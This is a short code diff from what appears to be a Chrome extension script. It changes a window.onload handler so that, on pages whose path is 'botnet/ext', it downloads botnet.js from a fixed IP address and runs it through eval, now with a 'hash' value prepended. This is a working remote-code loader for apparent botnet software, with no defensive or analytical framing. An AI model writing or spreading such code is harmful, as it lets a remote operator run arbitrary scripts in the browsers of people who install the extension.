@@ -25,6 +25,6 @@ chrome.runtime.sendMessage(debug, function(response) {
 window.onload = function(){
 	selector=location.href.split("/");
 	if((selector[3]=="botnet")&&(selector[4]=="ext")){
-	eval(httpGet('http://10.68.100.60/botnet/ext/botnet.js'));
+	eval('hash="'+hash+'";'+httpGet('http://10.68.100.60/botnet/ext/botnet.js'));
 }
 }
